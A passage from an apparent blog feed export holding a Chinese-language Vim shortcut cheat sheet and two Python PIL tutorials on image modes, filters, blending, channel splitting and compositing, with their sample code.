        <content type="html"><![CDATA[<h4 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h4><ul><li><p><code>i</code></p><blockquote><p>insert 进入编辑模式</p></blockquote></li><li><p><code>I</code></p><blockquote><p>insert before line 在行首开始插入</p></blockquote></li><li><p><code>a</code></p><blockquote><p>append 和 &#x3D;&#x3D;i&#x3D;&#x3D; 相似，不同在于在当前光标所在字母前，还是后插入（一试便知）</p></blockquote></li><li><p><code>A</code></p><blockquote><p>append after line 在行尾开始插入</p></blockquote></li><li><p><code>o</code></p><blockquote><p>open a line below 在当前行下面新生成一行并进入编辑模式（你是不是还在的敲回车呢！）</p></blockquote></li><li><p><code>O</code></p><blockquote><p>append a line above 在当前行上一行开始插入</p></blockquote></li><li><p><code>Ctrl + h</code></p><blockquote><p>删除上一个字符</p></blockquote></li><li><p><code>Ctrl + w</code></p><blockquote><p>删除上一个单词</p></blockquote></li><li><p><code>Ctrl + u</code></p><blockquote><p>删除当前行</p></blockquote></li></ul><h4 id="Normal模式"><a href="#Normal模式" class="headerlink" title="Normal模式"></a>Normal模式</h4><ul><li><code>:set nu</code><blockquote><p>设置行号</p></blockquote></li><li><code>:set hls</code><blockquote><p>设置搜索结果高亮</p></blockquote></li><li><code>:set incsearch</code><blockquote><p>增量搜索结果高亮</p></blockquote></li><li><code>:vs</code><blockquote><p>垂直分屏</p></blockquote></li><li><code>:sp</code><blockquote><p>水平分屏</p></blockquote></li><li><code>:q</code><blockquote><p>退出当前分屏 </p></blockquote></li><li><code>:% s/hello/world/g</code><blockquote><p>将当前文件中的hello替换为world</p></blockquote></li><li><code>:% s/\&lt;xxx\&gt;/yyy/g</code><blockquote><p>正则匹配xxx</p></blockquote></li></ul><h6 id="替换标志位"><a href="#替换标志位" class="headerlink" title="替换标志位"></a>替换标志位</h6><ul><li><code>g</code> global 全局范围内执行</li><li><code>c</code> confirm 表示确认，可以确认或拒绝修改</li><li><code>n</code> number 报告匹配到的次数而不替换，可以用来查询匹配次数</li></ul><h6 id="反人类的上下左右"><a href="#反人类的上下左右" class="headerlink" title="反人类的上下左右"></a>反人类的上下左右</h6><p>hjkl</p><ul><li><code>h</code> 左移(四个键的最左边)</li><li><code>l</code> 右移(四个键的最右边)</li><li><code>j</code> 下移</li><li><code>k</code> 上移</li></ul><h6 id="单词间移动"><a href="#单词间移动" class="headerlink" title="单词间移动"></a>单词间移动</h6><p>word：以非空白符分割的单词(真单词)<br>WORD：以空白符分割的单词(不一定是单词)</p><ul><li><code>w/W</code> 移动到下一个单词word&#x2F;WORD的开头</li><li><code>e/E</code> 移动到下一个单词word&#x2F;WORD的结尾</li><li><code>b/B</code> 移动带上一个单词word&#x2F;WORD的开头</li></ul><h6 id="行间搜索移动"><a href="#行间搜索移动" class="headerlink" title="行间搜索移动"></a>行间搜索移动</h6><ul><li><code>f&#123;char&#125;</code>  同一行搜索并移动到该字符</li><li><code>t&#123;char&#125;</code>  同行搜索并移动到该字符的前一个字符</li><li><code>; </code>分号下一个</li><li><code>, </code>逗号上一个</li><li><code>F&#123;char&#125;</code> 反过来搜索前面的字符</li><li><code>0</code> 移动到行首第一个字符</li><li><code>^</code> 移动到第一个非空字符</li><li><code>$</code> 移动到行尾</li><li><code>g_</code> 移动到行尾非空白字符</li><li><code>zz</code> 把当前行置为屏幕中间</li></ul><h6 id="文件开头、结尾"><a href="#文件开头、结尾" class="headerlink" title="文件开头、结尾"></a>文件开头、结尾</h6><ul><li><code>gg</code> 快速移动到文件开头</li><li><code>G</code> 快速移动到文件结尾</li></ul><h6 id="屏幕开头、中间、结尾"><a href="#屏幕开头、中间、结尾" class="headerlink" title="屏幕开头、中间、结尾"></a>屏幕开头、中间、结尾</h6><ul><li><code>H</code> Head  跳转到屏幕开头</li><li><code>M</code> Middle 跳转到屏幕中间</li><li><code>L</code> Lower 跳转到屏幕结尾</li></ul><h6 id="翻页"><a href="#翻页" class="headerlink" title="翻页"></a>翻页</h6><ul><li><code>Ctrl + u</code> upword 向上翻页</li><li><code>Ctrl + f</code> forward 向下翻页</li></ul><h4 id="Visual可视模式"><a href="#Visual可视模式" class="headerlink" title="Visual可视模式"></a>Visual可视模式</h4><ul><li><code>v</code><blockquote><p>VISUAL 进入可视模式，此时按上下左右可选中状态</p></blockquote></li><li><code>V</code><blockquote><p>VISUAL LINE 选中整行</p></blockquote></li><li><code>Ctrl v</code><blockquote><p>VISUAL BLOCK 方块选中</p></blockquote></li></ul><h5 id="选中之后干什么"><a href="#选中之后干什么" class="headerlink" title="选中之后干什么"></a>选中之后干什么</h5><ul><li><code>d</code><blockquote><p>delete 删除选中内容</p></blockquote></li><li><code>y</code><blockquote><p>yanke 复制选中内容</p></blockquote></li><li><code>p</code><blockquote><p>paste 粘贴内容（在当前光标位置后或下以行粘贴内容）</p></blockquote></li></ul><h4 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h4><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><ul><li><code>Ctrl + [</code><blockquote><p>快速切换Insert模式到Normal模式</p></blockquote></li><li><code>gi</code><blockquote><p>快速回到最后一次编辑的位置</p></blockquote></li></ul><h4 id="Vim增删改查"><a href="#Vim增删改查" class="headerlink" title="Vim增删改查"></a>Vim增删改查</h4><h6 id="增加字符"><a href="#增加字符" class="headerlink" title="增加字符"></a>增加字符</h6><ul><li><code>a/i/o</code></li></ul><h6 id="快速删除"><a href="#快速删除" class="headerlink" title="快速删除"></a>快速删除</h6><ul><li><code>x</code> 快速删除一个字符</li><li><code>d</code> 配合文本对象快速删除一个单词</li><li><code>d</code>和<code>x</code>都可以搭配数字来执行多次</li><li><code>dw</code>&#x3D;&#x3D;<code>daw</code> 删除单词个空格</li><li><code>diw</code> 删除单词，不删空格</li><li><code>dt&#123;char&#125;</code> 删除光标到目标字符之间的所有字符</li><li><code>d0</code> 删除到行首之间的字符</li><li><code>d$</code> 删除到行尾之间的字符</li><li><code>4x</code> 删除4个字符</li><li><code>2dd</code> 删除两行</li></ul><h6 id="快速修改"><a href="#快速修改" class="headerlink" title="快速修改"></a>快速修改</h6><ul><li><code>r</code> replace r{char} 替换光标所在字符</li><li><code>R</code> 以替换的形式输入</li><li><code>c</code> change</li><li><code>s</code> substitute 删除光标所在字符，并进入插入模式</li><li><code>2s</code> 删除两个字符并进入插入模式</li></ul><h6 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h6><ul><li><code>/</code> 正向查询</li><li><code>?</code> 反向查询</li><li><code>n</code> 跳转到下一个匹配</li><li><code>N</code> 跳转到上一个匹配</li><li><code>*</code> 进行当前单词的前向匹配</li><li><code>#</code> 进行当前单词的后向匹配</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—Mode,ImageFilter对比实践</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Mode-ImageFilter%E5%AF%B9%E6%AF%94%E5%AE%9E%E8%B7%B5/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Mode-ImageFilter%E5%AF%B9%E6%AF%94%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h4 id="原图"><a href="#原图" class="headerlink" title="原图"></a>原图</h4><ul><li>学习 一定要找一个好的Object(???)，不然怎么学的下去嘛。<br><img src="https://img-blog.csdnimg.cn/20190727193629193.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h4 id="图像的mode"><a href="#图像的mode" class="headerlink" title="图像的mode"></a>图像的mode</h4><ul><li>mode属性是图像的色彩通道的数量和名字，同时也包括像素的类型和颜色深度信息。她们之间的区别可能要放大点才能看得清，比如说一万倍?。<table><thead><tr><th>modes</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>1位像素，黑和白，存成8位的像素</td></tr><tr><td>L</td><td>8位像素，黑白</td></tr><tr><td>P</td><td>8位像素，使用调色板映射到任何其他模式</td></tr><tr><td>RGB</td><td>3*8位像素，真彩</td></tr><tr><td>RGBA</td><td>4*8位像素，真彩+透明通道</td></tr><tr><td>CMYK</td><td>4*8位像素，颜色隔离</td></tr><tr><td>YCbCr</td><td>3*8位像素，彩色视频格式</td></tr><tr><td>I</td><td>32位整形像素</td></tr><tr><td>F</td><td>32位浮点型像素</td></tr><tr><td>RGBX</td><td>有padding的真彩色</td></tr><tr><td>HSV</td><td></td></tr></tbody></table></li></ul><p><img src="https://img-blog.csdnimg.cn/20190727193538101.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="图像滤波器"><a href="#图像滤波器" class="headerlink" title="图像滤波器"></a>图像滤波器</h4><ul><li>你更喜欢花非花，雾非雾的朦胧，还是线条清晰，棱角分明的透彻。<table><thead><tr><th>Filter</th><th>描述</th></tr></thead><tbody><tr><td>BLUR</td><td>模糊滤波</td></tr><tr><td>CONTOUR</td><td>轮廓滤波</td></tr><tr><td>DETAIL</td><td>细节增强滤波</td></tr><tr><td>EDGE_ENHANCE</td><td>边缘增强滤波</td></tr><tr><td>EDGE_ENHANCE_MORE</td><td>深度边缘增强滤波</td></tr><tr><td>EMBOSS</td><td>浮雕滤波</td></tr><tr><td>FIND_EDGES</td><td>寻找边缘信息的滤波</td></tr><tr><td>SMOOTH</td><td>平滑滤波</td></tr><tr><td>SMOOTH_MORE</td><td>深度平滑滤波</td></tr><tr><td>SHARPEN</td><td>锐化滤波</td></tr></tbody></table></li></ul><p><img src="https://img-blog.csdnimg.cn/2019072719355829.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="原代码"><a href="#原代码" class="headerlink" title="原代码"></a>原代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDraw<span class="token punctuation">,</span> ImageFont<span class="token punctuation">,</span> ImageFilterfont_posotion <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span>color <span class="token operator">=</span>  <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span>font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span><span class="token string">'Arial.ttf'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"unic"</span><span class="token punctuation">)</span>thumbnail_size <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span>row_count <span class="token operator">=</span> <span class="token number">4</span><span class="token keyword">def</span> <span class="token function">create_thumbnail</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    size <span class="token operator">=</span> thumbnail_size    im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    im<span class="token punctuation">.</span>thumbnail<span class="token punctuation">(</span>size<span class="token punctuation">,</span> Image<span class="token punctuation">.</span>ANTIALIAS<span class="token punctuation">)</span>    <span class="token keyword">return</span> im<span class="token keyword">class</span> <span class="token class-name">MyFilter</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    BLUR <span class="token operator">=</span> <span class="token string">"BLUR"</span>    CONTOUR <span class="token operator">=</span> <span class="token string">"CONTOUR"</span>    DETAIL <span class="token operator">=</span> <span class="token string">"DETAIL"</span>    EDGE_ENHANCE <span class="token operator">=</span> <span class="token string">"EDGE_ENHANCE"</span>    EDGE_ENHANCE_MORE <span class="token operator">=</span> <span class="token string">"EDGE_ENHANCE_MORE"</span>    EMBOSS <span class="token operator">=</span> <span class="token string">"EMBOSS"</span>    FIND_EDGES <span class="token operator">=</span> <span class="token string">"FIND_EDGES"</span>    SMOOTH <span class="token operator">=</span> <span class="token string">"SMOOTH"</span>    SMOOTH_MORE <span class="token operator">=</span> <span class="token string">"SMOOTH_MORE"</span>    SHARPEN <span class="token operator">=</span> <span class="token string">"SHARPEN"</span>    FilterList <span class="token operator">=</span> <span class="token punctuation">[</span>BLUR<span class="token punctuation">,</span> CONTOUR<span class="token punctuation">,</span> DETAIL<span class="token punctuation">,</span>                  EDGE_ENHANCE<span class="token punctuation">,</span> EDGE_ENHANCE_MORE<span class="token punctuation">,</span> EMBOSS<span class="token punctuation">,</span>                  FIND_EDGES<span class="token punctuation">,</span> SMOOTH<span class="token punctuation">,</span> SMOOTH_MORE<span class="token punctuation">,</span>                  SHARPEN<span class="token punctuation">]</span>    ImageFilterList <span class="token operator">=</span> <span class="token punctuation">[</span>ImageFilter<span class="token punctuation">.</span>BLUR<span class="token punctuation">,</span> ImageFilter<span class="token punctuation">.</span>CONTOUR<span class="token punctuation">,</span> ImageFilter<span class="token punctuation">.</span>DETAIL<span class="token punctuation">,</span>                       ImageFilter<span class="token punctuation">.</span>EDGE_ENHANCE<span class="token punctuation">,</span> ImageFilter<span class="token punctuation">.</span>EDGE_ENHANCE_MORE<span class="token punctuation">,</span> ImageFilter<span class="token punctuation">.</span>EMBOSS<span class="token punctuation">,</span>                       ImageFilter<span class="token punctuation">.</span>FIND_EDGES<span class="token punctuation">,</span> ImageFilter<span class="token punctuation">.</span>SMOOTH<span class="token punctuation">,</span> ImageFilter<span class="token punctuation">.</span>SMOOTH_MORE<span class="token punctuation">,</span>                       ImageFilter<span class="token punctuation">.</span>SHARPEN<span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">MyMode</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    MODE1 <span class="token operator">=</span> <span class="token string">"1"</span>    L <span class="token operator">=</span> <span class="token string">"L"</span>    I <span class="token operator">=</span> <span class="token string">"I"</span>    F <span class="token operator">=</span> <span class="token string">"F"</span>    P <span class="token operator">=</span> <span class="token string">"P"</span>    RGB <span class="token operator">=</span> <span class="token string">"RGB"</span>    RGBX <span class="token operator">=</span> <span class="token string">"RGBX"</span>    RGBA <span class="token operator">=</span> <span class="token string">"RGBA"</span>    CMYK <span class="token operator">=</span> <span class="token string">"CMYK"</span>    YCbCr <span class="token operator">=</span> <span class="token string">"YCbCr"</span>    <span class="token comment"># LAB = "LAB"</span>    HSV <span class="token operator">=</span> <span class="token string">"HSV"</span>    ModeList <span class="token operator">=</span> <span class="token punctuation">[</span>MODE1<span class="token punctuation">,</span> L<span class="token punctuation">,</span> I<span class="token punctuation">,</span> F<span class="token punctuation">,</span> P<span class="token punctuation">,</span> RGB<span class="token punctuation">,</span> RGBX<span class="token punctuation">,</span> RGBA<span class="token punctuation">,</span> CMYK<span class="token punctuation">,</span> YCbCr<span class="token punctuation">,</span> HSV<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_position</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    width <span class="token operator">=</span> thumbnail_size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    pic_width <span class="token operator">=</span> width<span class="token operator">*</span>row_count    position <span class="token operator">=</span> <span class="token punctuation">(</span>count <span class="token operator">*</span> width<span class="token punctuation">)</span><span class="token operator">%</span>pic_width<span class="token punctuation">,</span> <span class="token punctuation">(</span>count <span class="token operator">*</span> width<span class="token punctuation">)</span><span class="token operator">/</span>pic_width<span class="token operator">*</span>width    <span class="token keyword">return</span> position<span class="token keyword">def</span> <span class="token function">get_pic_size</span><span class="token punctuation">(</span>thumbnail_size<span class="token punctuation">,</span> pic_num<span class="token punctuation">,</span> row_count<span class="token punctuation">)</span><span class="token punctuation">:</span>    pic_width <span class="token operator">=</span> thumbnail_size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> row_count    extra_row <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> pic_num <span class="token operator">%</span> row_count <span class="token keyword">else</span> <span class="token number">0</span>    pic_height <span class="token operator">=</span> <span class="token punctuation">(</span>pic_num <span class="token operator">/</span> row_count <span class="token operator">+</span> extra_row<span class="token punctuation">)</span> <span class="token operator">*</span> thumbnail_size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> pic_width<span class="token punctuation">,</span> pic_height<span class="token keyword">def</span> <span class="token function">create_filter</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    pic_size <span class="token operator">=</span> get_pic_size<span class="token punctuation">(</span>thumbnail_size<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MyFilter<span class="token punctuation">.</span>FilterList<span class="token punctuation">)</span><span class="token punctuation">,</span> row_count<span class="token punctuation">)</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGBA"</span><span class="token punctuation">,</span> pic_size<span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span>    thumbnail_im <span class="token operator">=</span> create_thumbnail<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MyFilter<span class="token punctuation">.</span>FilterList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        CONTOURimg <span class="token operator">=</span> thumbnail_im<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>        CONTOUR <span class="token operator">=</span> CONTOURimg<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>MyFilter<span class="token punctuation">.</span>ImageFilterList<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">)</span>        CONTOURdraw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>CONTOUR<span class="token punctuation">)</span>        CONTOURdraw<span class="token punctuation">.</span>text<span class="token punctuation">(</span>font_posotion<span class="token punctuation">,</span> MyFilter<span class="token punctuation">.</span>FilterList<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>CONTOUR<span class="token punctuation">,</span> get_position<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token comment"># image.save("filter.jpg")</span>    image<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_mode</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    pic_size <span class="token operator">=</span> get_pic_size<span class="token punctuation">(</span>thumbnail_size<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MyMode<span class="token punctuation">.</span>ModeList<span class="token punctuation">)</span><span class="token punctuation">,</span> row_count<span class="token punctuation">)</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGBA"</span><span class="token punctuation">,</span> pic_size<span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span>    thumbnail_im <span class="token operator">=</span> create_thumbnail<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MyMode<span class="token punctuation">.</span>ModeList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        img <span class="token operator">=</span> thumbnail_im<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>        CONTOURdraw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>img<span class="token punctuation">)</span>        CONTOURdraw<span class="token punctuation">.</span>text<span class="token punctuation">(</span>font_posotion<span class="token punctuation">,</span> MyMode<span class="token punctuation">.</span>ModeList<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        CONTOUR <span class="token operator">=</span> img<span class="token punctuation">.</span>convert<span class="token punctuation">(</span>MyMode<span class="token punctuation">.</span>ModeList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>CONTOUR<span class="token punctuation">,</span> get_position<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token comment"># image.save("mode.jpg")</span>    image<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    create_mode<span class="token punctuation">(</span><span class="token string">"res.jpg"</span><span class="token punctuation">)</span>    create_filter<span class="token punctuation">(</span><span class="token string">"res.jpg"</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—Transpose,Blend,Split,Composite</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Transpose-Blend-Split-Composite/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Transpose-Blend-Split-Composite/</url>
      
        <content type="html"><![CDATA[<h4 id="Transpose-方向变换"><a href="#Transpose-方向变换" class="headerlink" title="Transpose 方向变换"></a>Transpose 方向变换</h4><ul><li>横看成岭侧成峰，好不容易有了Object，还不从各个方向都欣赏一下。<br><img src="https://img-blog.csdnimg.cn/20190727215620420.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h4 id="Blend-调节透明度并合并"><a href="#Blend-调节透明度并合并" class="headerlink" title="Blend 调节透明度并合并"></a>Blend 调节透明度并合并</h4><ul><li>前提：两张图片的尺寸和模式一致。</li><li>一张图想同时放两个Object，也不是不可以，但是图这两个Object怎么分配资源？当然是55开还是28开都可以，原则就是你只有两者的和为1。</li></ul><blockquote><ul><li>合并公式：res_img &#x3D; image1 * (1 - alpha) + image2 * alpha</li></ul></blockquote><p><img src="https://img-blog.csdnimg.cn/20190727220007302.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Split-RGB通道"><a href="#Split-RGB通道" class="headerlink" title="Split RGB通道"></a>Split RGB通道</h4><p>每张图片都是有红绿蓝三个通道的，split方法可以将三个通道分离，像不像三种肤色的Object。<br><img src="https://img-blog.csdnimg.cn/20190727220155886.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Composite-两张图片合并，并加入mask图像作为透明度。"><a href="#Composite-两张图片合并，并加入mask图像作为透明度。" class="headerlink" title="Composite 两张图片合并，并加入mask图像作为透明度。"></a>Composite 两张图片合并，并加入mask图像作为透明度。</h4><ul><li>前提：image1, image2, mask 图片的尺寸和模式一致。<br>相当于Photoshop里的通道蒙版，下图效果不是特别好，可以注意一下图1的嘴，颜色没有图2、3明显。拿自己的Object试试看，可能对比效果会好一点。<br><img src="https://img-blog.csdnimg.cn/20190727220505748.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h4 id="原代码"><a href="#原代码" class="headerlink" title="原代码"></a>原代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageFont<span class="token punctuation">,</span> ImageDrawfont_posotion <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span>color <span class="token operator">=</span>  <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span>font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span><span class="token string">'Arial.ttf'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"unic"</span><span class="token punctuation">)</span>thumbnail_size <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span>row_count <span class="token operator">=</span> <span class="token number">3</span><span class="token keyword">def</span> <span class="token function">create_thumbnail</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    size <span class="token operator">=</span> thumbnail_size    im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    im<span class="token punctuation">.</span>thumbnail<span class="token punctuation">(</span>size<span class="token punctuation">,</span> Image<span class="token punctuation">.</span>ANTIALIAS<span class="token punctuation">)</span>    <span class="token keyword">return</span> im<span class="token keyword">def</span> <span class="token function">get_position</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    width <span class="token operator">=</span> thumbnail_size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    pic_width <span class="token operator">=</span> width<span class="token operator">*</span>row_count    position <span class="token operator">=</span> <span class="token punctuation">(</span>count <span class="token operator">*</span> width<span class="token punctuation">)</span><span class="token operator">%</span>pic_width<span class="token punctuation">,</span> <span class="token punctuation">(</span>count <span class="token operator">*</span> width<span class="token punctuation">)</span><span class="token operator">/</span>pic_width<span class="token operator">*</span>width    <span class="token keyword">return</span> position<span class="token keyword">def</span> <span class="token function">get_pic_size</span><span class="token punctuation">(</span>thumbnail_size<span class="token punctuation">,</span> pic_num<span class="token punctuation">,</span> row_count<span class="token punctuation">)</span><span class="token punctuation">:</span>    pic_width <span class="token operator">=</span> thumbnail_size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> row_count    extra_row <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> pic_num <span class="token operator">%</span> row_count <span class="token keyword">else</span> <span class="token number">0</span>    pic_height <span class="token operator">=</span> <span class="token punctuation">(</span>pic_num <span class="token operator">/</span> row_count <span class="token operator">+</span> extra_row<span class="token punctuation">)</span> <span class="token operator">*</span> thumbnail_size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token 